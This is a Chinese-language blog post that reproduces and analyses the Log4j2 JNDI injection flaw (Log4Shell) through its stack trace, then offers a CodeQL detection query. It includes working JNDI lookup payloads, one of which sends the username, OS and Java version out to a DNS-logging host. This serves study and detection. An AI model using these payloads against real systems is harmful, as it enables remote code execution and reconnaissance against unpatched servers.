# Log4j2 漏洞分析



## 从堆栈角度追击Log4j2 JNDI漏洞

### 漏洞复现

pom.xml

```xml
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>
    <parent>
        <groupId>org.springframework.boot</groupId>
        <artifactId>spring-boot-starter-parent</artifactId>
        <version>2.6.1</version>
        <relativePath/> <!-- lookup parent from repository -->
    </parent>
    <groupId>com.summersec</groupId>
    <artifactId>Log4j2</artifactId>
    <version>0.0.1-SNAPSHOT</version>
    <name>Log4j2</name>
    <description>Log4j2</description>
    <properties>
        <java.version>1.8</java.version>
    </properties>
    <dependencies>
        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-web</artifactId>
            <exclusions>
                <exclusion>
                    <artifactId>slf4j-api</artifactId>
                    <groupId>org.slf4j</groupId>
                </exclusion>
                <exclusion>
                    <artifactId>log4j-to-slf4j</artifactId>
                    <groupId>org.apache.logging.log4j</groupId>
                </exclusion>
                <exclusion>
                    <artifactId>jul-to-slf4j</artifactId>
                    <groupId>org.slf4j</groupId>
                </exclusion>
                <exclusion>
                    <artifactId>spring-boot-starter-logging</artifactId>
                    <groupId>org.springframework.boot</groupId>
                </exclusion>
            </exclusions>
        </dependency>
<!--        <dependency>-->
<!--            <groupId>org.springframework.boot</groupId>-->
<!--            <artifactId>spring-boot-starter-log4j2</artifactId>-->
<!--            <version>2.6.1</version>-->
<!--        </dependency>-->

        <dependency>
            <groupId>mysql</groupId>
            <artifactId>mysql-connector-java</artifactId>
            <scope>runtime</scope>
        </dependency>
        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-test</artifactId>
            <scope>test</scope>
            <exclusions>
                <exclusion>
                    <artifactId>slf4j-api</artifactId>
                    <groupId>org.slf4j</groupId>
                </exclusion>
            </exclusions>
        </dependency>
        <dependency>
            <groupId>org.apache.logging.log4j</groupId>
            <artifactId>log4j-core</artifactId>
            <version>2.13.3</version>
        </dependency>
        <dependency>
            <groupId>org.apache.logging.log4j</groupId>
            <artifactId>log4j-api</artifactId>
            <version>2.13.3</version>
        </dependency>
    </dependencies>

    <build>
        <plugins>
            <plugin>
                <groupId>org.springframework.boot</groupId>
                <artifactId>spring-boot-maven-plugin</artifactId>
            </plugin>
        </plugins>
    </build>

</project>
```

resources目录下插件一个**log4j2.xml**内容如下

```xml
<?xml version="1.0" encoding="UTF-8"?>
<Configuration status="WARN">
    <Appenders>
        <Console name="Console" target="SYSTEM_OUT">
            <PatternLayout pattern="%d{HH:mm:ss.SSS} [%t] %-5level %logger{36} - %msg%n"/>
        </Console>
    </Appenders>
    <Loggers>
        <Root level="info">
            <AppenderRef ref="Console"/>
        </Root>
    </Loggers>
</Configuration>
```

漏洞POC:

```
public class demo {
    static Logger logger = LogManager.getLogger(LogManager.ROOT_LOGGER_NAME);

    public static void main(String[] args) {
        String poc = "${jndi:ldap://${env:OS}.dnslog.cn}";
        logger.info("{}", poc);
    }
}

```



![image-20211221165044511](https://img.sumsec.me//49u4249ec49u4249ec.png)

### 漏洞分析

下面是这个漏洞触发的堆栈，分析漏洞触发的堆栈可以看出在哪触发的漏洞。

![image-20211221165729926](https://img.sumsec.me//43u4243ec43u4243ec.png)

可以发现0-11行是InitialContext.lookup触发JNDI漏洞的方式，可以直接删除。38-45行是spi接口转化也可以直接删除掉。
```
2021-12-21 16:02:40,406 main WARN Error looking up JNDI resource [ldap://Windows_NT.0cat.a0z7tw.0o0.run]. javax.naming.CommunicationException: Windows_NT.run:389 [Root exception is java.net.ConnectException: Connection refused: connect]
	at com.sun.jndi.ldap.Connection.<init>(Connection.java:226)
	at com.sun.jndi.ldap.LdapClient.<init>(LdapClient.java:137)
	at com.sun.jndi.ldap.LdapClient.getInstance(LdapClient.java:1614)
	at com.sun.jndi.ldap.LdapCtx.connect(LdapCtx.java:2746)
	at com.sun.jndi.ldap.LdapCtx.<init>(LdapCtx.java:319)
	at com.sun.jndi.url.ldap.ldapURLContextFactory.getUsingURLIgnoreRootDN(ldapURLContextFactory.java:60)
	at com.sun.jndi.url.ldap.ldapURLContext.getRootURLContext(ldapURLContext.java:61)
	at com.sun.jndi.toolkit.url.GenericURLContext.lookup(GenericURLContext.java:202)
	at com.sun.jndi.url.ldap.ldapURLContext.lookup(ldapURLContext.java:94)
	at javax.naming.InitialContext.lookup(InitialContext.java:417)
	at org.apache.logging.log4j.core.net.JndiManager.lookup(JndiManager.java:172)
	at org.apache.logging.log4j.core.lookup.JndiLookup.lookup(JndiLookup.java:56)
	at org.apache.logging.log4j.core.lookup.Interpolator.lookup(Interpolator.java:223)
	at org.apache.logging.log4j.core.lookup.StrSubstitutor.resolveVariable(StrSubstitutor.java:1116)
	at org.apache.logging.log4j.core.lookup.StrSubstitutor.substitute(StrSubstitutor.java:1038)
	at org.apache.logging.log4j.core.lookup.StrSubstitutor.substitute(StrSubstitutor.java:912)
	at org.apache.logging.log4j.core.lookup.StrSubstitutor.replace(StrSubstitutor.java:467)
	at org.apache.logging.log4j.core.pattern.MessagePatternConverter.format(MessagePatternConverter.java:132)
	at org.apache.logging.log4j.core.pattern.PatternFormatter.format(PatternFormatter.java:38)
	at org.apache.logging.log4j.core.layout.PatternLayout$PatternSerializer.toSerializable(PatternLayout.java:345)
	at org.apache.logging.log4j.core.layout.PatternLayout.toText(PatternLayout.java:244)
	at org.apache.logging.log4j.core.layout.PatternLayout.encode(PatternLayout.java:229)
	at org.apache.logging.log4j.core.layout.PatternLayout.encode(PatternLayout.java:59)
	at org.apache.logging.log4j.core.appender.AbstractOutputStreamAppender.directEncodeEvent(AbstractOutputStreamAppender.java:197)
	at org.apache.logging.log4j.core.appender.AbstractOutputStreamAppender.tryAppend(AbstractOutputStreamAppender.java:190)
	at org.apache.logging.log4j.core.appender.AbstractOutputStreamAppender.append(AbstractOutputStreamAppender.java:181)
	at org.apache.logging.log4j.core.config.AppenderControl.tryCallAppender(AppenderControl.java:156)
	at org.apache.logging.log4j.core.config.AppenderControl.callAppender0(AppenderControl.java:129)
	at org.apache.logging.log4j.core.config.AppenderControl.callAppenderPreventRecursion(AppenderControl.java:120)
	at org.apache.logging.log4j.core.config.AppenderControl.callAppender(AppenderControl.java:84)
	at org.apache.logging.log4j.core.config.LoggerConfig.callAppenders(LoggerConfig.java:543)
	at org.apache.logging.log4j.core.config.LoggerConfig.processLogEvent(LoggerConfig.java:502)
	at org.apache.logging.log4j.core.config.LoggerConfig.log(LoggerConfig.java:485)
	at org.apache.logging.log4j.core.config.LoggerConfig.log(LoggerConfig.java:460)
	at org.apache.logging.log4j.core.config.AwaitCompletionReliabilityStrategy.log(AwaitCompletionReliabilityStrategy.java:82)
	at org.apache.logging.log4j.core.Logger.log(Logger.java:161)
	at org.apache.logging.log4j.spi.AbstractLogger.tryLogMessage(AbstractLogger.java:2198)
	at org.apache.logging.log4j.spi.AbstractLogger.logMessageTrackRecursion(AbstractLogger.java:2152)
	at org.apache.logging.log4j.spi.AbstractLogger.logMessageSafely(AbstractLogger.java:2135)
	at org.apache.logging.log4j.spi.AbstractLogger.logMessage(AbstractLogger.java:2028)
	at org.apache.logging.log4j.spi.AbstractLogger.logIfEnabled(AbstractLogger.java:1899)
	at org.apache.logging.log4j.spi.AbstractLogger.info(AbstractLogger.java:1444)
	at com.summersec.log4j2.vuldemo.demo.main(demo.java:20)
16:02:34.590 [main] INFO   - ${jndi:ldap://${env:OS}.run}
```

删除调用之后的结果就是下面的结果，

```
	at org.apache.logging.log4j.core.net.JndiManager.lookup(JndiManager.java:172)
	at org.apache.logging.log4j.core.lookup.JndiLookup.lookup(JndiLookup.java:56)
	at org.apache.logging.log4j.core.lookup.Interpolator.lookup(Interpolator.java:223)
	at org.apache.logging.log4j.core.lookup.StrSubstitutor.resolveVariable(StrSubstitutor.java:1116)
	at org.apache.logging.log4j.core.lookup.StrSubstitutor.substitute(StrSubstitutor.java:1038)
	at org.apache.logging.log4j.core.lookup.StrSubstitutor.substitute(StrSubstitutor.java:912)
	at org.apache.logging.log4j.core.lookup.StrSubstitutor.replace(StrSubstitutor.java:467)
	at org.apache.logging.log4j.core.pattern.MessagePatternConverter.format(MessagePatternConverter.java:132)
	at org.apache.logging.log4j.core.pattern.PatternFormatter.format(PatternFormatter.java:38)
	at org.apache.logging.log4j.core.layout.PatternLayout$PatternSerializer.toSerializable(PatternLayout.java:345)
	at org.apache.logging.log4j.core.layout.PatternLayout.toText(PatternLayout.java:244)
	at org.apache.logging.log4j.core.layout.PatternLayout.encode(PatternLayout.java:229)
	at org.apache.logging.log4j.core.layout.PatternLayout.encode(PatternLayout.java:59)
	at org.apache.logging.log4j.core.appender.AbstractOutputStreamAppender.directEncodeEvent(AbstractOutputStreamAppender.java:197)
	at org.apache.logging.log4j.core.appender.AbstractOutputStreamAppender.tryAppend(AbstractOutputStreamAppender.java:190)
	at org.apache.logging.log4j.core.appender.AbstractOutputStreamAppender.append(AbstractOutputStreamAppender.java:181)
	at org.apache.logging.log4j.core.config.AppenderControl.tryCallAppender(AppenderControl.java:156)
	at org.apache.logging.log4j.core.config.AppenderControl.callAppender0(AppenderControl.java:129)
	at org.apache.logging.log4j.core.config.AppenderControl.callAppenderPreventRecursion(AppenderControl.java:120)
	at org.apache.logging.log4j.core.config.AppenderControl.callAppender(AppenderControl.java:84)
	at org.apache.logging.log4j.core.config.LoggerConfig.callAppenders(LoggerConfig.java:543)
	at org.apache.logging.log4j.core.config.LoggerConfig.processLogEvent(LoggerConfig.java:502)
	at org.apache.logging.log4j.core.config.LoggerConfig.log(LoggerConfig.java:485)
	at org.apache.logging.log4j.core.config.LoggerConfig.log(LoggerConfig.java:460)
	at org.apache.logging.log4j.core.config.AwaitCompletionReliabilityStrategy.log(AwaitCompletionReliabilityStrategy.java:82)
	at org.apache.logging.log4j.core.Logger.log(Logger.java:161)
```

org\apache\logging\log4j\core\Logger.class#log方法

![image-20211221173425676](https://img.sumsec.me///37u3837ec/37u3837ec.png)

AwaitCompletionReliabilityStrategy.class#log方法会首先读取配置文件

![image-20211222101833800](https://img.sumsec.me///40u1840ec40u1840ec.png)



LoggerConfig.class#log方法，首先会进行一个properties判断，方法一共执行箭头三步然后调用另一个复写log方法。

![image-20211222104135609](https://img.sumsec.me///35u4135ec35u4135ec.png)

![image-20211222104828817](https://img.sumsec.me///28u4828ec28u4828ec.png)

进入processLogEvent方法只会调用callAppenders方法

![image-20211222105031335](https://img.sumsec.me///31u5031ec31u5031ec.png)

callAppenders方法判断配置文件中日志输出位置，一般是控制台以及输出到文件，这里只配置了控制台。

![image-20211222105610431](https://img.sumsec.me///10u5610ec10u5610ec.png)



org.apache.logging.log4j.core.config.AppenderControl#callAppender会调用callAppenderPreventRecursion方法，主要是防止递归调用。

```java
    public void callAppender(LogEvent event) {
        if (!this.shouldSkip(event)) {
            this.callAppenderPreventRecursion(event);
        }
    }
```

先进行防止递归调用，然后调用**callAppender0**方法

```java
private void callAppenderPreventRecursion(LogEvent event) {
    try {
        this.recursive.set(this);
        this.callAppender0(event);
    } finally {
        this.recursive.set((Object)null);
    }

}
```

callAppender0方法首先确保lAppender启动，然后调用tryCallAppender

```java
private void callAppender0(LogEvent event) {
    this.ensureAppenderStarted();
    if (!this.isFilteredByAppender(event)) {
        this.tryCallAppender(event);
    }

}
```

tryCallAppender会追加改event，其中包含log日志。

```java
private void tryCallAppender(LogEvent event) {
    try {
        this.appender.append(event);
.......
}
```

AbstractOutputStreamAppender.class#append会调用tryAppend方法

```java
public void append(LogEvent event) {
    try {
        this.tryAppend(event);
    } catch (AppenderLoggingException var3) {
        this.error("Unable to write to stream " + this.manager.getName() + " for appender " + this.getName(), event, var3);
        throw var3;
    }
}
```

AbstractOutputStreamAppender.class#tryAppend方法会调用directEncodeEvent方法漏洞触发点

```java
private void tryAppend(LogEvent event) {
    if (Constants.ENABLE_DIRECT_ENCODERS) { //默认true
        this.directEncodeEvent(event);
    } else {
        this.writeByteArrayToManager(event);
    }

}
```

AbstractOutputStreamAppender.class#directEncodeEvent 。Layout是配置文件写的格式，获取格式之后，会将poc用按照格式进行解码。

```java
protected void directEncodeEvent(LogEvent event) {
    this.getLayout().encode(event, this.manager);
    if (this.immediateFlush || event.isEndOfBatch()) {
        this.manager.flush();
    }

}
```

![image-20211222113029725](https://img.sumsec.me///29u3029ec29u3029ec.png)



org.apache.logging.log4j.core.layout.PatternLayout.class#encode会序列化，将**event**序列化

```java
public void encode(LogEvent event, ByteBufferDestination destination) {
    if (!(this.eventSerializer instanceof Serializer2)) {
        super.encode(event, destination);
    } else {
        StringBuilder text = this.toText((Serializer2)this.eventSerializer, event, getStringBuilder());
        Encoder<StringBuilder> encoder = this.getStringBuilderEncoder();
        encoder.encode(text, destination);
        trimToMaxSize(text);
    }
}
```

进入toText方法直接调用序列化方法

```java
private StringBuilder toText(Serializer2 serializer, LogEvent event, StringBuilder destination) {
    return serializer.toSerializable(event, destination);
}
```

 this.formatters.length = 11 ，看堆栈报错发现是org.apache.logging.log4j.core.pattern.MessagePatternConverter#format的方法，可以发现是第九个

```java
public StringBuilder toSerializable(LogEvent event, StringBuilder buffer) {
    int len = this.formatters.length;

    for(int i = 0; i < len; ++i) {
        this.formatters[i].format(event, buffer);
    }

    if (this.replace != null) {
        String str = buffer.toString();
        str = this.replace.format(str);
        buffer.setLength(0);
        buffer.append(str);
    }

    return buffer;
}
```

![image-20211222142537774](https://img.sumsec.me///37u2537ec37u2537ec.png)



中间省略两步方法调用

MessagePatternConverter.class

![image-20211222143251847](https://img.sumsec.me///52u3252ec52u3252ec.png)

![image-20211222143404552](https://img.sumsec.me///4u344ec4u344ec.png)



这里可以看出来为什么payload有**${}**字符串了，进入replace方法跳转到StrSubstitutor.class#replace

![image-20211222143748258](https://img.sumsec.me///48u3748ec48u3748ec.png)



![image-20211222144558770](https://img.sumsec.me///58u4558ec58u4558ec.png)

StrSubstitutor.class#substitute方法可以发现为什么有那么多畸形的payload

![image-20211222145801763](https://img.sumsec.me///2u582ec2u582ec.png)

传入给resolveVariable方法参数值可以发现恶意payload已经传进来了

![image-20211222150445643](https://img.sumsec.me///45u445ec45u445ec.png)



resolver中有一个strLookupMap，可以发现执行各种协议，以及自定义的lookup方法。

![image-20211222151238735](https://img.sumsec.me///38u1238ec38u1238ec.png)

进入lookup方法到\org\apache\logging\log4j\core\lookup\Interpolator.class#lookup方法，首先会判断**env:OS**字符串的前缀长度env。

![image-20211222151902111](https://img.sumsec.me///2u192ec2u192ec.png)



Map会获取对应的lookup类，如果是env就是EnvironmentLookup类，JNDI就是JndiLookup，最终会调用对应方法，

![image-20211222152008815](https://img.sumsec.me///9u209ec9u209ec.png)



JNDilookup类会调用jndiManager#lookup方法，

![image-20211222152719317](https://img.sumsec.me///19u2719ec19u2719ec.png)



最终调用的是下面的lookup方法导致JNDI的RCE，Context类型是java.naming.context。Context类在jdk也是发起JNDI请求**"漏洞"**类。

```java
    public <T> T lookup(String name) throws NamingException {
        return this.context.lookup(name);
    }
```



---

### 实战环境中漏洞利用可能性

首先确定用户名、操作系统以及Java的版本

```java
${jndi:ldap://${env:USERNAME}.${env:OS}.${sys:java.version}.dnslog.cn}
```

其次可能存在的问题不出网本质就是和jndi不出网一样。如果单纯的是http不出网，还能有本地classpath中存在反序列化漏洞组件去打，

如果ldap都不出网就gg。下图是log4j漏洞利用示例图，有点遗憾的是缺少一点本地反序列化流程。

![image-20211222174953272](https://img.sumsec.me///53u4953ec53u4953ec.png)



---



## CodeQL 发现log4j2漏洞

这个ql规则可以寻找源码中是否调用log4j2相关jar文件，并判断是否存在log4j2漏洞。

```ql
/**
 * @name Log4j Injection
 * @description Detects log4j calls with user-controlled data.
 * @kind path-problem
 * @problem.severity error
 * @precision high
 * @id java/log-injection
 * @tags security
 *       external/cwe/cwe-117
 */

import java
import DataFlow::PathGraph
import semmle.code.java.dataflow.FlowSources

class Log4jCall extends MethodAccess {
  Log4jCall() {
    exists(RefType t, Method m |
      t.hasQualifiedName("org.apache.log4j", ["Category", "Logger", "LogBuilder"]) // Log4j v1
      or
      t.hasQualifiedName("org.apache.logging.log4j", ["Logger", "LogBuilder", "LoggerManager"]) // Log4j v2 or
      or
      t.hasQualifiedName("org.apache.logging.log4j.core", ["Logger", "LogBuilder", "LoggerManager"]) // Log4j v2
      or
      t.hasQualifiedName("org.apache.logging.log4j.status", "StatusLogger") // Log4j Status logger
      or
      t.hasQualifiedName("org.slf4j", ["Logger", "LoggingEventBuilder"]) and // SLF4J Logger is used when Log4j core is on classpath
      log4JJarCoreJarFilePresent()
    |
      (
        m.getDeclaringType().getASourceSupertype*() = t or
        m.getDeclaringType().extendsOrImplements*(t)
      ) and
      m.getReturnType() instanceof VoidType and
      this = m.getAReference()
    )
  }

  Argument getALogArgument() { result = this.getArgument(_) }
}

/**
 * A taint-tracking configuration for tracking untrusted user input used in log entries.
 */
private class Log4JInjectionConfiguration extends TaintTracking::Configuration {
  Log4JInjectionConfiguration() { this = "Log4j Injection" }

  override predicate isSource(DataFlow::Node source) { source instanceof RemoteFlowSource }

  override predicate isSink(DataFlow::Node sink) {
    sink.asExpr() = any(Log4jCall c).getALogArgument()
  }

  override predicate isSanitizer(DataFlow::Node node) {
    node.getType() instanceof BoxedType or node.getType() instanceof PrimitiveType
  }
}

predicate log4JJCoreJarFile(JarFile file) { file.getBaseName().matches("%log4j-core%") }

predicate log4JJarCoreJarFilePresent() { log4JJCoreJarFile(_) }

from Log4JInjectionConfiguration cfg, DataFlow::PathNode source, DataFlow::PathNode sink
where cfg.hasFlowPath(source, sink)
select sink.getNode(), source, sink, "$@ flows to log4j call.", source.getNode(),
  "User-provided value"
```

[lgtm for log4j2](https://lgtm.com/projects/g/apache/logging-log4j2/?mode=list&result_filter=0e00f5fa7b93849767c1677dc71d9400f85c6a54&severity=) 这个漏洞是**漏洞作者**当时看lgtm官方ql查询结果反推的。

![image-20211223134932093](https://img.sumsec.me///32u4932ec32u4932ec.png)



[LookupInterface](https://github.com/SummerSec/LookupInterface)此项目是当时我去看雪大会演讲时发起的一个项目，当时就发现了log4j2存在可以触发JNDI漏洞请求的类。也就是发现并公开这个sink，可惜当时想着是寻找jdk中Context替代类并没有进一步研究这个类在log4j2是否存在JNDI漏洞。（事后了解到这个sink在2020年的时候就被人ql规则到codeql了）

![image-20211223112603446](https://img.sumsec.me///10u2610ec10u2610ec.png)







## 总结



**漏洞本身**

就这个漏洞本身来说，lookup本身就其功能之一，官方文档本身就写了[lookup](https://logging.apache.org/log4j/2.x/manual/lookups.html)的使用方法以及构造格式等。

**漏洞分析**

可以发现每一步都对应到报错而抛出了的异常堆栈信息，这样子分析漏洞可以大大减少无法定位到漏洞点，不知何处下手分析漏洞而浪费的时间。缺点得知道payload并且报错，不过该方法对于不需要第一时间去分析漏洞原因人足够了。~~比例myself~~

**漏洞利用**

本质上还是和JNDI漏洞利用一样，可以完全照搬画虎。

**题外话**

对于我来说，发现这个sink没有去研究是否存在漏洞当时是漏洞曝光两三天来说确实是觉得挺可惜的，但事后看到阿里云事件反而有点庆幸没有发现。



----



## 参考



https://mp.weixin.qq.com/s/vAE89A5wKrc-YnvTr0qaNg

https://lgtm.com/query/2987343899101655784/

https://xz.aliyun.com/t/10659